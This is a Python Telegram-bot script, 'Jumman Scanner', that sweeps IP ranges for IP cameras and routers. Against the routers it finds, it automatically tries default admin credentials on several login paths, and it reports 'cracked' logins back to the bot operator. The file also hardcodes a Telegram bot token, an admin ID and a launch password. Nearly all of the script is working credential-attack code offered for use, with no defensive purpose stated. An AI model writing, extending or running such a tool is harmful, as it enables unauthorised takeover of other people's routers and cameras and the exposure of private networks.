#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🔥 JUMMAN SCANNER - TERMUX EDITION 🔥                 ║
║     📷 IP Camera & Router Scanner                          ║
║     👑 Owner: Jumman                                       ║
║     🔐 Password: ch71                                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import hashlib
import socket
import ipaddress
import subprocess
import re
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============ PASSWORD PROTECTION ============
REQUIRED_PASSWORD = "ch71"

def check_password():
    """Check password before running tool"""
    print("\n" + "=" * 50)
    print("🔐 JUMMAN SCANNER - PASSWORD PROTECTED")
    print("=" * 50)
    print("\n⚠️  This tool is password protected!")
    print("👑 Owner: Jumman")
    print("📱 Version: 3.2\n")
    
    attempts = 3
    for attempt in range(attempts):
        password = input(f"🔑 Enter password ({attempts - attempt} attempts left): ").strip()
        
        if password == REQUIRED_PASSWORD:
            print("\n✅ Access Granted! Loading tool...\n")
            time.sleep(1)
            return True
        else:
            print(f"❌ Wrong password! {attempts - attempt - 1} attempts remaining\n")
    
    print("\n🚫 Access Denied! Too many failed attempts.")
    print("Contact the administrator for access.")
    sys.exit(1)

# ============ INSTALL DEPENDENCIES ============
def install_dependencies():
    """Install required packages for Python 3.14"""
    print("[*] Checking/Installing dependencies...")
    
    # Install requests
    try:
        import requests
        print("[✓] requests already installed")
    except ImportError:
        print("[*] Installing requests...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    
    # Install python-telegram-bot (newer version)
    try:
        import telegram
        print("[✓] python-telegram-bot already installed")
    except ImportError:
        print("[*] Installing python-telegram-bot...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
    
    # Install urllib3 for Python 3.14
    try:
        import urllib3
        print("[✓] urllib3 already installed")
    except ImportError:
        print("[*] Installing urllib3...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3"])

# ============ IMPORTS ============
install_dependencies()

import requests as http_requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ BOT CONFIGURATION ============
BOT_TOKEN = "8818530631:AAEEBZA59IFgVOAxP819XcQAge2Y-tfCZ5Y"
ADMIN_IDS = [6501841918]

KEY_FILE = "access.key"
CONFIG_FILE = "config.json"

# ============ ACCESS KEY SYSTEM ============
class AccessKeySystem:
    def __init__(self):
        self.key_file = KEY_FILE
        self.config_file = CONFIG_FILE
        self.load_config()
    
    def load_config(self):
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
            else:
                self.config = {'first_run': True}
        except:
            self.config = {'first_run': True}
    
    def save_config(self):
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f)
        except:
            pass
    
    def generate_key_hash(self, key):
        return hashlib.sha256(key.encode()).hexdigest()
    
    def is_first_run(self):
        return self.config.get('first_run', True)
    
    def set_first_run_done(self):
        self.config['first_run'] = False
        self.save_config()
    
    def save_key(self, key):
        try:
            key_hash = self.generate_key_hash(key)
            with open(self.key_file, 'w') as f:
                f.write(key_hash)
            return True
        except:
            return False
    
    def verify_key(self, key):
        try:
            if not os.path.exists(self.key_file):
                return False
            with open(self.key_file, 'r') as f:
                stored_hash = f.read().strip()
            key_hash = self.generate_key_hash(key)
            return key_hash == stored_hash
        except:
            return False
    
    def reset_key(self):
        if os.path.exists(self.key_file):
            os.remove(self.key_file)
        if os.path.exists(self.config_file):
            os.remove(self.config_file)
        return True


# ============ SCANNER FUNCTIONS ============
class JummanScanner:
    def __init__(self):
        self.results = {}
        self.cameras = []
        self.routers = []
        self.cracked = []
        self.scanning = False
        
    def validate_ip(self, ip_str):
        try:
            ipaddress.IPv4Address(ip_str)
            return True
        except:
            return False
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return None
    
    def extract_title(self, html_content):
        try:
            match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
            return "No Title"
        except:
            return "No Title"
    
    def scan_single_ip(self, ip):
        results = []
        ports = [80, 8080, 443, 8081, 554, 8000, 37777]
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    try:
                        protocol = 'https' if port == 443 else 'http'
                        url = f"{protocol}://{ip}:{port}"
                        response = http_requests.get(url, timeout=2, verify=False, allow_redirects=True)
                        
                        if response.status_code in [200, 401, 403]:
                            content = response.text.lower()
                            title = self.extract_title(response.text)
                            
                            camera_keywords = ['camera', 'cam', 'ipcam', 'web service', 'dvr', 
                                             'hikvision', 'dahua', 'login.asp', 'web', 'cgi-bin']
                            is_camera = any(kw in content for kw in camera_keywords)
                            
                            router_keywords = ['tenda', 'd-link', 'dlink', 'tp-link', 'tplink', 
                                             'router', 'admin', 'login', 'gateway']
                            is_router = any(kw in content for kw in router_keywords)
                            
                            if is_camera:
                                brand = 'Unknown'
                                if 'hikvision' in content:
                                    brand = 'HIK Vision'
                                elif 'dahua' in content:
                                    brand = 'Dahua'
                                elif 'tenda' in content:
                                    brand = 'Tenda'
                                elif 'tp-link' in content:
                                    brand = 'TP-Link'
                                
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'type': 'Camera',
                                    'brand': brand,
                                    'title': title,
                                    'url': url
                                })
                            elif is_router:
                                brand = 'unknown'
                                for b in ['tenda', 'dlink', 'tplink']:
                                    if b in content:
                                        brand = b
                                        break
                                
                                credentials = self.test_credentials(url, brand)
                                
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'type': 'Router',
                                    'brand': brand,
                                    'url': url,
                                    'credentials': credentials
                                })
                    except:
                        pass
            except:
                pass
        
        return results
    
    def test_credentials(self, url, brand):
        credentials = [
            ('admin', 'admin'),
            ('admin', 'admin1'),
            ('admin', 'admin2'),
            ('admin', 'admin123')
        ]
        
        found = []
        login_paths = ['/', '/login', '/login.html', '/admin', '/cgi-bin/login']
        
        for username, password in credentials:
            for path in login_paths:
                try:
                    test_url = url + path
                    form_data = {
                        'username': username,
                        'password': password,
                        'user': username,
                        'pass': password,
                        'usr': username,
                        'pwd': password,
                    }
                    response = http_requests.post(test_url, data=form_data, timeout=2, 
                                            allow_redirects=True, verify=False)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        if 'invalid' not in content and 'incorrect' not in content:
                            found.append({
                                'username': username,
                                'password': password,
                                'url': test_url
                            })
                            return found
                except:
                    pass
        
        return found
    
    def scan_range(self, start_ip, end_ip):
        results = []
        try:
            start = int(ipaddress.IPv4Address(start_ip))
            end = int(ipaddress.IPv4Address(end_ip))
            
            if start > end:
                return {'error': 'Start IP must be less than End IP'}
            
            ip_list = []
            for ip_int in range(start, end + 1):
                if ip_int - start > 500:
                    break
                ip_list.append(str(ipaddress.IPv4Address(ip_int)))
            
            with ThreadPoolExecutor(max_workers=100) as executor:
                future_results = executor.map(self.scan_single_ip, ip_list)
                for result in future_results:
                    if result:
                        results.extend(result)
            
            return results
        except Exception as e:
            return {'error': str(e)}
    
    def scan_common_ranges(self):
        all_results = []
        common_ranges = [
            ('192.168.1.1', '192.168.1.254'),
            ('192.168.0.1', '192.168.0.254'),
            ('10.0.0.1', '10.0.0.254'),
            ('172.16.0.1', '172.16.0.254'),
        ]
        
        for start, end in common_ranges:
            results = self.scan_range(start, end)
            if isinstance(results, list):
                all_results.extend(results)
        
        return all_results


# ============ TELEGRAM BOT (UPDATED FOR v20.x) ============
class JummanBot:
    def __init__(self, token):
        self.token = token
        self.scanner = JummanScanner()
        self.key_system = AccessKeySystem()
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("🚫 *Access Denied!*", parse_mode='Markdown')
            return
        
        keyboard = [
            [InlineKeyboardButton("⚡ Quick Scan", callback_data='quick_scan')],
            [InlineKeyboardButton("🔍 IP Range Scan", callback_data='range_scan')],
            [InlineKeyboardButton("📷 Camera Scanner", callback_data='camera_scan')],
            [InlineKeyboardButton("🌐 Router Scanner", callback_data='router_scan')],
            [InlineKeyboardButton("🌍 Full Scan", callback_data='full_scan')],
            [InlineKeyboardButton("🔐 Admin", callback_data='admin_panel')],
            [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_msg = (
            "🤖 *Jumman Scanner Bot*\n\n"
            "🔥 *Features:*\n"
            "• 📷 IP Camera Detection\n"
            "• 🌐 Router Detection\n"
            "• 💀 4 Password Testing\n"
            "• ⚡ Super Fast Scanning\n\n"
            "👑 *Owner:* Jumman\n"
            "📱 *Version:* 3.2\n\n"
            "Select an option!"
        )
        
        await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("🚫 Access Denied!")
            return
        
        data = query.data
        
        if data == 'quick_scan':
            await self.quick_scan(update, context)
        elif data == 'range_scan':
            await query.edit_message_text("🔍 Send: `/setscan 192.168.1.1 192.168.1.255`", parse_mode='Markdown')
        elif data == 'camera_scan':
            await query.edit_message_text("📷 Send: `/camerascan 192.168.1.1 192.168.1.255`", parse_mode='Markdown')
        elif data == 'router_scan':
            await query.edit_message_text("🌐 Send: `/routerscan 192.168.1.1 192.168.1.255`", parse_mode='Markdown')
        elif data == 'full_scan':
            await self.full_scan(update, context)
        elif data == 'admin_panel':
            await self.admin_panel(update, context)
        elif data == 'help':
            await self.help(update, context)
        elif data == 'main_menu':
            await self.start(update, context)
    
    async def quick_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Quick scan local network"""
        query = update.callback_query
        
        local_ip = self.scanner.get_local_ip()
        if not local_ip:
            await query.edit_message_text("❌ Could not detect local network!")
            return
        
        subnet = ".".join(local_ip.split(".")[:3])
        start_ip = f"{subnet}.1"
        end_ip = f"{subnet}.50"
        
        await query.edit_message_text(
            f"⚡ *Quick Scan Started!*\n\n"
            f"📡 Scanning: {start_ip} - {end_ip}\n"
            f"⏳ Please wait...",
            parse_mode='Markdown'
        )
        
        results = self.scanner.scan_range(start_ip, end_ip)
        context.bot_data['last_results'] = results
        await self.display_results(update, context, results, query.message)
    
    async def full_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Full network scan"""
        query = update.callback_query
        
        await query.edit_message_text(
            "🌍 *Full Scan Started!*\n\n"
            "⏳ This may take 3-5 minutes...",
            parse_mode='Markdown'
        )
        
        results = self.scanner.scan_common_ranges()
        context.bot_data['last_results'] = results
        await self.display_results(update, context, results, query.message)
    
    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin panel"""
        query = update.callback_query
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("🚫 Admin access required!")
            return
        
        keyboard = [
            [InlineKeyboardButton("🔄 Reset Key", callback_data='reset_key')],
            [InlineKeyboardButton("🔙 Main", callback_data='main_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text("🔐 *Admin Panel*", reply_markup=reply_markup, parse_mode='Markdown')
    
    async def reset_key(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Reset access key"""
        query = update.callback_query
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("🚫 Admin access required!")
            return
        
        if self.key_system.reset_key():
            await query.edit_message_text("✅ Key reset! Use /setkey 123456")
        else:
            await query.edit_message_text("❌ Failed to reset!")
    
    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Help command"""
        query = update.callback_query
        
        help_text = """
ℹ️ *JUMMAN SCANNER BOT*

🤖 *Commands:*
/start - Main menu
/quickscan - Quick scan
/setscan <start> <end> - Custom scan
/fullscan - Full network scan
/camerascan <start> <end> - Camera only
/routerscan <start> <end> - Router only
/status - Bot status
/help - This help
/setkey 123456 - Set access key

💀 *Passwords Tested:*
• admin:admin
• admin:admin1
• admin:admin2
• admin:admin123

👑 *Owner:* Jumman
📱 *Version:* 3.2
"""
        
        keyboard = [[InlineKeyboardButton("🔙 Main", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def display_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results, message=None):
        """Display scan results"""
        if not results:
            if message:
                await message.edit_text("❌ No devices found.")
            return
        
        cameras = [r for r in results if r['type'] == 'Camera']
        routers = [r for r in results if r['type'] == 'Router']
        cracked = [r for r in routers if r.get('credentials')]
        
        text = "🔍 *Results*\n\n"
        text += f"📷 Cameras: {len(cameras)}\n"
        text += f"🌐 Routers: {len(routers)}\n"
        text += f"💀 Cracked: {len(cracked)}\n\n"
        
        if cameras:
            text += "*📷 Cameras:*\n"
            for cam in cameras[:5]:
                text += f"• {cam['ip']}:{cam['port']} - {cam['title'][:30]}\n"
            if len(cameras) > 5:
                text += f"_...and {len(cameras)-5} more_\n"
            text += "\n"
        
        if routers:
            text += "*🌐 Routers:*\n"
            for router in routers[:5]:
                text += f"• {router['ip']}:{router['port']} [{router['brand'].upper()}]\n"
                if router.get('credentials'):
                    cred = router['credentials'][0]
                    text += f"  ✅ `{cred['username']}:{cred['password']}`\n"
            if len(routers) > 5:
                text += f"_...and {len(routers)-5} more_\n"
        
        keyboard = [
            [InlineKeyboardButton("🔄 Scan Again", callback_data='quick_scan')],
            [InlineKeyboardButton("🔙 Main", callback_data='main_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if message:
            await message.edit_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("🚫 Access Denied!")
            return
        
        text = update.message.text
        
        if text.startswith('/setkey'):
            try:
                key = text.split()[1]
                if key.isdigit() and len(key) == 6:
                    if self.key_system.save_key(key):
                        await update.message.reply_text("✅ Key set successfully!")
                    else:
                        await update.message.reply_text("❌ Failed to set key!")
                else:
                    await update.message.reply_text("❌ Use 6 digits! Example: /setkey 123456")
            except:
                await update.message.reply_text("❌ Usage: /setkey 123456")
            return
        
        if text.startswith('/camerascan'):
            try:
                parts = text.split()[1:]
                if len(parts) >= 2:
                    start_ip, end_ip = parts[0], parts[1]
                    if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
                        await update.message.reply_text(f"📷 *Camera Scan Started!*", parse_mode='Markdown')
                        results = self.scanner.scan_range(start_ip, end_ip)
                        camera_results = [r for r in results if r['type'] == 'Camera'] if isinstance(results, list) else []
                        context.bot_data['last_results'] = camera_results
                        await self.display_results(update, context, camera_results)
                    else:
                        await update.message.reply_text("❌ Invalid IP!")
                else:
                    await update.message.reply_text("❌ Usage: /camerascan <start> <end>")
            except:
                pass
            return
        
        if text.startswith('/routerscan'):
            try:
                parts = text.split()[1:]
                if len(parts) >= 2:
                    start_ip, end_ip = parts[0], parts[1]
                    if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
                        await update.message.reply_text(f"🌐 *Router Scan Started!*", parse_mode='Markdown')
                        results = self.scanner.scan_range(start_ip, end_ip)
                        router_results = [r for r in results if r['type'] == 'Router'] if isinstance(results, list) else []
                        context.bot_data['last_results'] = router_results
                        await self.display_results(update, context, router_results)
                    else:
                        await update.message.reply_text("❌ Invalid IP!")
                else:
                    await update.message.reply_text("❌ Usage: /routerscan <start> <end>")
            except:
                pass
            return
        
        if text.startswith('/fullscan'):
            await update.message.reply_text("🌍 *Full Scan Started!*", parse_mode='Markdown')
            results = self.scanner.scan_common_ranges()
            context.bot_data['last_results'] = results
            await self.display_results(update, context, results)
            return
        
        if text.startswith('/setscan'):
            try:
                parts = text.split()[1:]
                if len(parts) >= 2:
                    start_ip, end_ip = parts[0], parts[1]
                    if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
                        await update.message.reply_text(f"🔍 *Scan Started!*", parse_mode='Markdown')
                        results = self.scanner.scan_range(start_ip, end_ip)
                        context.bot_data['last_results'] = results
                        await self.display_results(update, context, results)
                    else:
                        await update.message.reply_text("❌ Invalid IP!")
                else:
                    await update.message.reply_text("❌ Usage: /setscan <start> <end>")
            except:
                pass
    
    async def quickscan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Quick scan command"""
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("🚫 Access Denied!")
            return
        
        local_ip = self.scanner.get_local_ip()
        if not local_ip:
            await update.message.reply_text("❌ Could not detect local network!")
            return
        
        subnet = ".".join(local_ip.split(".")[:3])
        start_ip = f"{subnet}.1"
        end_ip = f"{subnet}.50"
        
        await update.message.reply_text(f"⚡ *Quick Scan Started!*", parse_mode='Markdown')
        results = self.scanner.scan_range(start_ip, end_ip)
        context.bot_data['last_results'] = results
        await self.display_results(update, context, results)
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check bot status"""
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("🚫 Access Denied!")
            return
        
        status_text = (
            "📊 *Status*\n\n"
            f"Bot: 🟢 Online\n"
            f"Version: 3.2\n"
            f"Owner: Jumman\n\n"
            "/start - Main menu"
        )
        await update.message.reply_text(status_text, parse_mode='Markdown')
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Help command"""
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("🚫 Access Denied!")
            return
        
        help_text = """
ℹ️ *JUMMAN SCANNER BOT*

🤖 *Commands:*
/start - Main menu
/quickscan - Quick scan
/setscan <start> <end> - Custom scan
/fullscan - Full scan
/camerascan <start> <end> - Camera only
/routerscan <start> <end> - Router only
/status - Bot status
/help - This help
/setkey 123456 - Set access key

💀 *Passwords Tested:*
• admin:admin
• admin:admin1
• admin:admin2
• admin:admin123

👑 *Owner:* Jumman
"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        print(f"[!] Error: {context.error}")
    
    def run(self):
        """Run the bot"""
        print("=" * 40)
        print("🤖 Jumman Scanner Bot")
        print(f"👑 Owner: Jumman")
        print("📱 Version: 3.2")
        print("=" * 40)
        print("\n✅ Bot starting...")
        
        # Create application
        self.application = Application.builder().token(self.token).build()
        
        # Add handlers
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("quickscan", self.quickscan_command))
        self.application.add_handler(CommandHandler("setscan", self.handle_message))
        self.application.add_handler(CommandHandler("fullscan", self.handle_message))
        self.application.add_handler(CommandHandler("camerascan", self.handle_message))
        self.application.add_handler(CommandHandler("routerscan", self.handle_message))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("setkey", self.handle_message))
        
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Error handler
        self.application.add_error_handler(self.error_handler)
        
        # Start bot
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)


# ============ MAIN ============
def main():
    # Check password first
    check_password()
    
    # Install dependencies
    install_dependencies()
    
    try:
        bot = JummanBot(BOT_TOKEN)
        bot.run()
    except KeyboardInterrupt:
        print("\n[!] Bot stopped")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()